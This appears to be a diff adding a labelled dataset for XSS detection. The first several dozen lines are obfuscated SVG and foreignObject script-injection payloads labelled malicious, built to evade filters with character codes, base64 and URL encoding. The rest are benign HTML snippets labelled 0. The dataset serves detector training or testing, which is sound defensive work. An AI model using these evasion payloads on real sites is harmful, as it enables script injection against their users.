+<svg onload=window[String.fromCharCode(101,118,97,108)](decodeURIComponent('%61%6C%65%72%74(1)'))>	1
+<svg onload=window[String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)](1)>	1
+<svg onload=window[String.fromCharCode(97,108,101,114,116)](1)>	1
+<svg onload=window[String.fromCharCode(97,108,101,114,116)](1)></svg>	1
+<svg onload=window[`\u0061lert`](1)>	1
+<svg onload=window[`\x61\x6c\x65\x72\x74`](1)>	1
+<svg onload=window[`al${String.fromCharCode(101,114,116)}`](1)>	1
+<svg onload=window[`al`+`ert`](1)>	1
+<svg onload=window[`al`+`ert`](1)></svg>	1
+<svg onload=window[atob('YWw=')+'ert'](1)>	1
+<svg onload=window[atob('YWx'+'lcnQ=')](1)>	1
+<svg onload=window[atob('YWxlcnQ=')](1)>	1
+<svg onload=window[atob('YWxlcnQ=')](1)></svg>	1
+<svg onload=window[atob('YWxlcnQ=')].apply(null,[1])>	1
+<svg onload=window[decodeURI('%61%6C%65%72%74')](1)>	1
+<svg onload=window[decodeURIComponent('%61%6C%65%72%74')](1)>	1
+<svg onload=window[unescape('%61%6C%65%72%74')](1)>	1
+<svg onload=window[unescape('%61%6c%65%72%74')](1)>	1
+<svg onload=window[unescape('%61lert')](1)>	1
+<svg onload=window[unescape('%u0061lert')](1)>	1
+<svg xmlns="http://www.w3.org/2000/svg" onload="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;XSS&#39;&#41;">	1
+<svg xmlns="http://www.w3.org/2000/svg" onload="&#97;&#108;&#101;&#114;&#116;(1)">	1
+<svg xmlns="http://www.w3.org/2000/svg" onload="eval(String.fromCharCode(97,108,101,114,116,40,49,41))"></svg>	1
+<svg xmlns="http://www.w3.org/2000/svg" onload="eval(atob('YWxlcnQoMSk='))"></svg>	1
+<svg xmlns="http://www.w3.org/2000/svg" onload="eval(decodeURI('%61%6c%65%72%74%28%60%58%53%53%60%29'))"></svg>	1
+<svg xmlns="http://www.w3.org/2000/svg" onload="eval(unescape('%61%6c%65%72%74%28%31%29'))"></svg>	1
+<svg/onload="&#97;&#108;&#101;&#114;&#116;&#96;&#88;&#83;&#83;&#96;">	1
+<svg/onload="&#97;&#108;&#101;&#114;&#116;&#96;1`">	1
+<svg/onload="e\u0076al('alert(1)')">	1
+<svg/onload="eval('\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029')">	1
+<svg/onload="eval(atob('YWxlcnQoIlhTUyIp'))"></svg>	1
+<svg/onload='[].map.constructor("al"+"er"+"t"+"\x28"+"1\x29")()'>	1
+<svg/onload='eval(atob("YWxlcnQoMCk="))'>	1
+<svg/onload='eval(atob(`YWxlcnQoJ1hTUyEnKQ==`))'>	1
+<svg/onload='eval(unescape(`%61%6c%65%72%74%28%31%29`))'>	1
+<svg/onload=(eval)('ale'+'rt')(1)>	1
+<svg/onload=Function('al'+'ert(1)')()>	1
+<svg/onload=eval('al'+'ert(1)')>	1
+<svg/onload=eval('co'+'nfirm(1)')>	1
+<svg/onload=eval(String.fromCharCode(97)+'lert'+String.fromCharCode(40)+49+String.fromCharCode(41))>	1
+<svg/onload=eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+`rt(1)`)>	1
+<svg/onload=eval(String.fromCharCode(97,108,101,114,116)+'\x28"1"\x29')>	1
+<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>	1
+<svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>	1
+<svg/onload=eval(atob('Y29uZmlybSgxKQ=='))>	1
+<svg/onload=eval(atob('YWxlcnQoJzEnKQ=='))>	1
+<svg/onload=eval(atob('YWxlcnQoMSk='))>	1
+<svg/onload=eval(decodeURIComponent('%61%6c%65%72%74%28%31%29'))>	1
+<svg/onload=eval(unescape('%61%6c%65%72%74%28%31%29'))>	1
+<svg/onload=setTimeout('ale'+'rt(1)',0)>	1
+<svg/onload=setTimeout(Function("al\x65rt(1)"),0)>	1
+<svg/onload=setTimeout(`\u0061lert(1)`)>	1
+<svg/onload=window['al'+'ert'](1)>	1
+<svg/onload=window['ev'+'al']('al'+'ert(1)')>	1
+<svg><animate onbegin=window['al'+'ert'](1) /></svg>	1
+<svg><foreignObject><iframe srcdoc="<img src=x onerror=alert(1)>"></foreignObject></svg>	1
+<svg><foreignObject><iframe srcdoc="<script>eval(unescape('%61%6c%65%72%74%28%31%31%31%29'))</script>"></foreignObject></svg>	1
+<svg><foreignObject><iframe srcdoc="<svg onload=alert(1)>"></foreignObject></svg>	1
+<svg><foreignObject><img src=x onerror='&#97;&#x6c;&#101;&#114;&#x74;&#40;1&#41;'></foreignObject></svg>	1
+<svg><foreignObject><img src=x onerror='eval(atob("YWxlcnQoMSk="))'></foreignObject></svg>	1
+<svg><foreignObject><img src=x onerror='eval(decodeURIComponent("%61%6c%65%72%74%28%31%29"))'></foreignObject></svg>	1
+<svg><set onbegin="window['al'+'ert']('XSS')"></set></svg>	1
+<table alt="benign">normal</table>	0
+<table alt="benign">test</table>	0
+<table alt="content">benign</table>	0
+<table alt="content">content</table>	0
+<table alt="hello">content</table>	0
+<table alt="hello">normal</table>	0
+<table alt="hello">sample</table>	0
+<table alt="hello">world</table>	0
+<table alt="normal">benign</table>	0
+<table alt="normal">content</table>	0
+<table alt="normal">test</table>	0
+<table alt="normal">world</table>	0
+<table alt="sample">benign</table>	0
+<table alt="test">benign</table>	0
+<table alt="test">content</table>	0
+<table alt="test">hello</table>	0
+<table alt="test">test</table>	0
+<table alt="world">benign</table>	0
+<table alt="world">hello</table>	0
+<table alt="world">test</table>	0
+<table class="content">content</table>	0
+<table class="content">sample</table>	0
+<table class="hello">benign</table>	0
+<table class="hello">hello</table>	0
+<table class="hello">world</table>	0
+<table class="normal">benign</table>	0
+<table class="normal">content</table>	0
+<table class="normal">hello</table>	0
+<table class="normal">test</table>	0
+<table class="normal">world</table>	0
+<table class="sample">benign</table>	0
+<table class="sample">normal</table>	0
+<table class="sample">sample</table>	0
+<table class="test">content</table>	0
+<table class="test">sample</table>	0
+<table class="test">test</table>	0
+<table class="world">content</table>	0
+<table class="world">normal</table>	0
+<table class="world">test</table>	0
+<table href="benign">benign</table>	0
+<table href="benign">normal</table>	0
+<table href="benign">sample</table>	0
+<table href="benign">world</table>	0
+<table href="content">hello</table>	0
+<table href="content">normal</table>	0
+<table href="hello">benign</table>	0
+<table href="hello">normal</table>	0
+<table href="hello">world</table>	0
+<table href="normal">benign</table>	0
+<table href="normal">content</table>	0
+<table href="normal">hello</table>	0
+<table href="normal">world</table>	0
+<table href="sample">benign</table>	0
+<table href="sample">content</table>	0
+<table href="sample">normal</table>	0
+<table href="test">world</table>	0
+<table href="world">hello</table>	0
+<table href="world">normal</table>	0
+<table id="benign">hello</table>	0
+<table id="benign">normal</table>	0
+<table id="content">content</table>	0
+<table id="content">hello</table>	0
+<table id="content">world</table>	0
+<table id="hello">normal</table>	0
+<table id="normal">world</table>	0
+<table id="sample">benign</table>	0
+<table id="sample">hello</table>	0
+<table id="sample">normal</table>	0
+<table id="sample">sample</table>	0
+<table id="test">hello</table>	0
+<table id="world">sample</table>	0
+<table id="world">test</table>	0
+<table src="benign">content</table>	0
+<table src="benign">test</table>	0
+<table src="benign">world</table>	0
+<table src="content">sample</table>	0
+<table src="hello">test</table>	0
+<table src="normal">content</table>	0
+<table src="normal">hello</table>	0
+<table src="normal">normal</table>	0
+<table src="normal">world</table>	0
+<table src="sample">normal</table>	0
+<table src="sample">test</table>	0
+<table src="test">benign</table>	0
+<table src="test">sample</table>	0
+<table src="test">test</table>	0
+<table src="world">sample</table>	0
+<table src="world">test</table>	0
+<table src="world">world</table>	0
+<table style="benign">benign</table>	0
+<table style="benign">normal</table>	0
+<table style="benign">sample</table>	0
+<table style="content">benign</table>	0
+<table style="content">normal</table>	0
+<table style="content">sample</table>	0
+<table style="hello">content</table>	0
+<table style="hello">sample</table>	0
+<table style="normal">sample</table>	0
+<table style="normal">world</table>	0
+<table style="sample">content</table>	0
+<table style="sample">hello</table>	0
+<table style="sample">test</table>	0
+<table style="test">content</table>	0
+<table style="test">hello</table>	0
+<table style="test">sample</table>	0
+<table style="test">test</table>	0
+<table style="test">world</table>	0
+<table style="world">hello</table>	0
+<table style="world">sample</table>	0
+<table style="world">test</table>	0
+<table style="world">world</table>	0
+<table title="benign">benign</table>	0
+<table title="benign">content</table>	0
+<table title="benign">hello</table>	0
+<table title="benign">world</table>	0
+<table title="content">normal</table>	0
+<table title="content">sample</table>	0
+<table title="hello">content</table>	0
+<table title="hello">hello</table>	0
+<table title="hello">normal</table>	0
+<table title="hello">sample</table>	0
+<table title="normal">content</table>	0
+<table title="normal">sample</table>	0
+<table title="normal">world</table>	0
+<table title="sample">benign</table>	0
+<table title="sample">content</table>	0
+<table title="sample">sample</table>	0
+<table title="test">benign</table>	0
+<table title="test">normal</table>	0
+<table title="test">test</table>	0
+<table title="world">benign</table>	0
+<table title="world">hello</table>	0
+<table title="world">test</table>	0
+<table title="world">world</table>	0
+<td alt="benign">sample</td>	0
+<td alt="content">benign</td>	0
+<td alt="content">test</td>	0
+<td alt="content">world</td>	0
+<td alt="hello">hello</td>	0
+<td alt="hello">world</td>	0
+<td alt="normal">benign</td>	0
+<td alt="normal">hello</td>	0
+<td alt="normal">normal</td>	0
+<td alt="sample">benign</td>	0
+<td alt="test">benign</td>	0
+<td alt="test">content</td>	0
+<td alt="test">world</td>	0
+<td alt="world">normal</td>	0
+<td alt="world">test</td>	0
+<td class="benign">benign</td>	0
+<td class="benign">content</td>	0
+<td class="benign">world</td>	0
+<td class="content">benign</td>	0
+<td class="content">normal</td>	0
+<td class="content">test</td>	0
+<td class="hello">test</td>	0
+<td class="normal">hello</td>	0
+<td class="normal">normal</td>	0
+<td class="normal">test</td>	0
+<td class="normal">world</td>	0
+<td class="sample">hello</td>	0
+<td class="test">hello</td>	0
+<td class="test">world</td>	0
+<td class="world">content</td>	0
+<td class="world">hello</td>	0
+<td class="world">world</td>	0
+<td href="benign">benign</td>	0
+<td href="benign">content</td>	0
+<td href="benign">hello</td>	0
+<td href="benign">world</td>	0
+<td href="hello">benign</td>	0
+<td href="hello">content</td>	0
+<td href="hello">hello</td>	0
+<td href="hello">test</td>	0
+<td href="hello">world</td>	0
+<td href="normal">normal</td>	0
+<td href="normal">test</td>	0
+<td href="sample">hello</td>	0
+<td href="sample">normal</td>	0
+<td href="sample">test</td>	0
+<td href="test">benign</td>	0
+<td href="test">normal</td>	0
+<td href="test">test</td>	0
+<td href="world">hello</td>	0
+<td id="benign">benign</td>	0
+<td id="benign">content</td>	0
+<td id="benign">test</td>	0
+<td id="benign">world</td>	0
+<td id="content">benign</td>	0
+<td id="content">sample</td>	0
+<td id="content">test</td>	0
+<td id="hello">world</td>	0
+<td id="sample">benign</td>	0
+<td id="sample">content</td>	0
+<td id="sample">normal</td>	0
+<td id="sample">test</td>	0
+<td id="test">benign</td>	0
+<td id="test">content</td>	0
+<td id="test">test</td>	0
+<td id="world">test</td>	0
+<td id="world">world</td>	0
+<td src="benign">hello</td>	0
+<td src="benign">world</td>	0
+<td src="content">content</td>	0
+<td src="content">normal</td>	0
+<td src="content">test</td>	0
+<td src="content">world</td>	0
+<td src="hello">hello</td>	0
+<td src="normal">benign</td>	0
+<td src="normal">content</td>	0
+<td src="normal">sample</td>	0
+<td src="sample">content</td>	0
+<td src="sample">normal</td>	0
+<td src="sample">test</td>	0
+<td src="sample">world</td>	0
+<td src="test">sample</td>	0
+<td src="test">world</td>	0
+<td src="world">sample</td>	0
+<td src="world">test</td>	0
+<td style="benign">world</td>	0
+<td style="content">content</td>	0
+<td style="content">sample</td>	0
+<td style="content">test</td>	0
+<td style="content">world</td>	0
+<td style="hello">benign</td>	0
+<td style="hello">normal</td>	0
+<td style="hello">world</td>	0
+<td style="normal">benign</td>	0
+<td style="normal">hello</td>	0
+<td style="normal">world</td>	0
+<td style="sample">sample</td>	0
+<td style="test">normal</td>	0
+<td style="test">world</td>	0
+<td style="world">benign</td>	0
+<td style="world">normal</td>	0
+<td title="benign">hello</td>	0
+<td title="benign">normal</td>	0
+<td title="content">benign</td>	0
+<td title="content">hello</td>	0
+<td title="hello">test</td>	0
+<td title="hello">world</td>	0
+<td title="normal">normal</td>	0
+<td title="normal">world</td>	0
+<td title="sample">hello</td>	0
+<td title="sample">test</td>	0
+<td title="test">benign</td>	0
+<td title="test">hello</td>	0
+<td title="test">sample</td>	0
+<td title="world">benign</td>	0
+<td title="world">hello</td>	0
+<td title="world">sample</td>	0
+<tr alt="benign">benign</tr>	0
+<tr alt="benign">hello</tr>	0
+<tr alt="benign">world</tr>	0
+<tr alt="content">hello</tr>	0
+<tr alt="hello">content</tr>	0
+<tr alt="hello">normal</tr>	0
+<tr alt="hello">test</tr>	0
+<tr alt="sample">content</tr>	0
+<tr alt="sample">normal</tr>	0
+<tr alt="sample">world</tr>	0
+<tr alt="test">content</tr>	0
+<tr alt="test">sample</tr>	0
+<tr alt="test">test</tr>	0
+<tr alt="world">benign</tr>	0
+<tr alt="world">content</tr>	0
+<tr alt="world">hello</tr>	0
+<tr class="benign">content</tr>	0
+<tr class="benign">normal</tr>	0
+<tr class="benign">sample</tr>	0
+<tr class="content">content</tr>	0
+<tr class="content">hello</tr>	0
+<tr class="content">normal</tr>	0
+<tr class="content">sample</tr>	0
+<tr class="content">test</tr>	0
+<tr class="hello">test</tr>	0
+<tr class="normal">content</tr>	0
+<tr class="normal">sample</tr>	0
+<tr class="normal">test</tr>	0
+<tr class="sample">content</tr>	0
+<tr class="sample">sample</tr>	0
+<tr class="sample">world</tr>	0
+<tr class="test">benign</tr>	0
+<tr class="test">content</tr>	0
+<tr class="test">world</tr>	0
+<tr class="world">benign</tr>	0
+<tr class="world">content</tr>	0
+<tr href="benign">sample</tr>	0
+<tr href="content">test</tr>	0
+<tr href="content">world</tr>	0
+<tr href="hello">hello</tr>	0
+<tr href="normal">content</tr>	0
+<tr href="normal">world</tr>	0
+<tr href="sample">content</tr>	0
+<tr href="sample">normal</tr>	0
+<tr href="sample">sample</tr>	0
+<tr href="sample">test</tr>	0
+<tr href="test">content</tr>	0
+<tr href="test">hello</tr>	0
+<tr href="test">sample</tr>	0
+<tr href="test">world</tr>	0
+<tr href="world">benign</tr>	0
+<tr href="world">sample</tr>	0
+<tr id="benign">benign</tr>	0
+<tr id="benign">test</tr>	0
+<tr id="content">content</tr>	0
+<tr id="content">world</tr>	0
+<tr id="hello">benign</tr>	0
+<tr id="hello">hello</tr>	0
+<tr id="hello">normal</tr>	0
+<tr id="hello">sample</tr>	0
+<tr id="hello">test</tr>	0
+<tr id="normal">normal</tr>	0
+<tr id="normal">test</tr>	0
+<tr id="normal">world</tr>	0
+<tr id="sample">content</tr>	0
+<tr id="test">content</tr>	0
+<tr id="test">hello</tr>	0
+<tr id="test">normal</tr>	0
+<tr id="test">world</tr>	0
+<tr id="world">benign</tr>	0
+<tr id="world">hello</tr>	0
+<tr id="world">world</tr>	0
+<tr src="benign">normal</tr>	0
+<tr src="benign">sample</tr>	0
+<tr src="content">content</tr>	0
+<tr src="content">hello</tr>	0
+<tr src="content">normal</tr>	0
+<tr src="content">test</tr>	0
+<tr src="hello">benign</tr>	0
+<tr src="sample">benign</tr>	0
+<tr src="sample">content</tr>	0
+<tr src="sample">sample</tr>	0
+<tr src="test">hello</tr>	0
+<tr style="benign">hello</tr>	0
+<tr style="content">benign</tr>	0
+<tr style="content">test</tr>	0
+<tr style="hello">hello</tr>	0
+<tr style="hello">normal</tr>	0
+<tr style="normal">benign</tr>	0
+<tr style="normal">test</tr>	0
+<tr style="sample">benign</tr>	0
+<tr style="sample">normal</tr>	0
+<tr style="sample">sample</tr>	0
+<tr style="sample">test</tr>	0
+<tr style="world">hello</tr>	0
+<tr style="world">normal</tr>	0
+<tr title="content">content</tr>	0
+<tr title="content">sample</tr>	0
+<tr title="content">test</tr>	0
+<tr title="hello">hello</tr>	0
+<tr title="hello">sample</tr>	0
+<tr title="hello">test</tr>	0
+<tr title="normal">normal</tr>	0
+<tr title="normal">test</tr>	0
+<tr title="sample">content</tr>	0
+<tr title="sample">hello</tr>	0
+<tr title="test">content</tr>	0
+<tr title="test">sample</tr>	0
+<tr title="test">test</tr>	0
+<tr title="test">world</tr>	0
+<tr title="world">benign</tr>	0
+<tr title="world">content</tr>	0
+<tr title="world">hello</tr>	0
+<tr title="world">world</tr>	0
+<ul alt="benign">content</ul>	0
+<ul alt="benign">normal</ul>	0
+<ul alt="benign">world</ul>	0
+<ul alt="content">benign</ul>	0
+<ul alt="content">hello</ul>	0
+<ul alt="content">normal</ul>	0
+<ul alt="content">world</ul>	0
+<ul alt="hello">test</ul>	0
+<ul alt="normal">normal</ul>	0
+<ul alt="normal">sample</ul>	0
+<ul alt="normal">test</ul>	0
+<ul alt="sample">benign</ul>	0
+<ul alt="sample">sample</ul>	0
+<ul alt="test">hello</ul>	0
+<ul alt="test">normal</ul>	0
+<ul alt="world">benign</ul>	0
+<ul alt="world">content</ul>	0
+<ul alt="world">normal</ul>	0
+<ul alt="world">sample</ul>	0
+<ul class="benign">benign</ul>	0
+<ul class="benign">content</ul>	0
+<ul class="benign">test</ul>	0
+<ul class="content">world</ul>	0
+<ul class="hello">content</ul>	0
+<ul class="hello">sample</ul>	0
+<ul class="hello">world</ul>	0
+<ul class="normal">normal</ul>	0
+<ul class="normal">test</ul>	0
+<ul class="normal">world</ul>	0
+<ul class="sample">hello</ul>	0
+<ul class="sample">normal</ul>	0
+<ul class="test">test</ul>	0
+<ul class="world">benign</ul>	0
+<ul class="world">normal</ul>	0
+<ul href="benign">normal</ul>	0
+<ul href="content">content</ul>	0
+<ul href="content">sample</ul>	0
+<ul href="content">test</ul>	0
+<ul href="content">world</ul>	0
+<ul href="hello">normal</ul>	0
+<ul href="hello">sample</ul>	0
+<ul href="hello">test</ul>	0
+<ul href="normal">hello</ul>	0
+<ul href="normal">normal</ul>	0
+<ul href="sample">benign</ul>	0
+<ul href="sample">content</ul>	0
+<ul href="sample">normal</ul>	0
+<ul href="test">content</ul>	0
+<ul href="test">normal</ul>	0
+<ul href="test">world</ul>	0
+<ul href="world">benign</ul>	0
+<ul id="benign">benign</ul>	0
+<ul id="benign">normal</ul>	0
+<ul id="benign">test</ul>	0
+<ul id="content">hello</ul>	0
+<ul id="content">world</ul>	0
+<ul id="hello">content</ul>	0
+<ul id="hello">hello</ul>	0
+<ul id="hello">normal</ul>	0
+<ul id="normal">content</ul>	0
+<ul id="normal">test</ul>	0
+<ul id="normal">world</ul>	0
+<ul id="sample">test</ul>	0
+<ul id="test">content</ul>	0
+<ul id="world">hello</ul>	0
+<ul id="world">normal</ul>	0
+<ul src="benign">hello</ul>	0
+<ul src="benign">test</ul>	0
+<ul src="content">hello</ul>	0
+<ul src="content">world</ul>	0
+<ul src="hello">normal</ul>	0
+<ul src="hello">sample</ul>	0
+<ul src="hello">test</ul>	0
+<ul src="normal">content</ul>	0
+<ul src="normal">hello</ul>	0
+<ul src="sample">content</ul>	0
+<ul src="sample">hello</ul>	0
+<ul src="sample">sample</ul>	0
+<ul src="test">benign</ul>	0
+<ul src="test">content</ul>	0
+<ul src="test">hello</ul>	0
+<ul src="world">benign</ul>	0
+<ul src="world">sample</ul>	0
+<ul src="world">test</ul>	0
+<ul style="benign">benign</ul>	0
+<ul style="benign">normal</ul>	0
+<ul style="benign">test</ul>	0
+<ul style="benign">world</ul>	0
+<ul style="hello">sample</ul>	0
+<ul style="normal">hello</ul>	0
+<ul style="sample">content</ul>	0
+<ul style="sample">hello</ul>	0
+<ul style="sample">sample</ul>	0
+<ul style="test">hello</ul>	0
+<ul style="test">sample</ul>	0
+<ul style="world">benign</ul>	0
+<ul style="world">normal</ul>	0
+<ul style="world">world</ul>	0
+<ul title="benign">sample</ul>	0
+<ul title="content">sample</ul>	0
+<ul title="content">world</ul>	0
+<ul title="hello">content</ul>	0
+<ul title="hello">world</ul>	0
+<ul title="normal">benign</ul>	0
+<ul title="normal">normal</ul>	0
+<ul title="sample">benign</ul>	0
+<ul title="sample">normal</ul>	0
+<ul title="sample">test</ul>	0
+<ul title="test">sample</ul>	0
+<ul title="test">world</ul>	0
+<ul title="world">content</ul>	0
+<ul title="world">normal</ul>	0
+<ul title="world">sample</ul>	0
+<ul title="world">test</ul>	0
+<ul title="world">world</ul>	0
